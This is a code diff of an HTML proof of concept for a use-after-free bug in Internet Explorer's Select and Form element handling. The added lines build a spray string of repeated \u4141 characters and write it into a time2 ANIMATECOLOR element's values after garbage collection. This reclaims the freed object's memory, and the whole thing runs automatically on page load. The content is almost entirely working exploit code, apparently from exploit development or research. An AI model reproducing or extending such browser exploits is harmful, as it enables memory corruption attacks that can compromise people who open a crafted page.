@@ -1,4 +1,9 @@
 <!DOCTYPE html>
+<HTML XMLNS:t ="urn:schemas-microsoft-com:time">
+<head>
+    <meta>
+    <?IMPORT namespace="t" implementation="#default#time2">
+    </meta>
 <html>
 <head>
 <script>
@@ -10,6 +15,13 @@ In Internet Explorer, the implementation of Select HTML element contains an arra
 
 function ivan()
 {
+	var animvalues="\u4141\u4141";
+    while(animvalues.length < 0x1f8/2) {
+        animvalues += animvalues;
+    }
+    for(i = 0; i < 13; i++) {
+        animvalues += ";cyan";
+    }
 
     Math.atan2(0xbadc0de, "obtaining reference to select and form")
         var formobj, selobj, optobj;
@@ -27,9 +39,12 @@ function ivan()
         selobj.innerText = "foo";
 
     CollectGarbage();
-    //formobj.className = "s2s2s2s2s2s2s2s2s2s2s2s2X";
-    formobj.className = "\u3f49\u4141s2s2s2s2s2s2s2s2s2s2s2s2X";
-	
+    
+	try {
+        a = document.getElementById('myanim');
+        a.values = animvalues;
+    }catch(e){}
+
 
     Math.atan2(0xbadc0de, "reseting form")
         formobj.reset();
@@ -39,6 +54,7 @@ function ivan()
 </head>
 
 <body onload='ivan()'>
+<t:ANIMATECOLOR id="myanim"/>
 <form method="post">
 <select id="select1">
 </select>
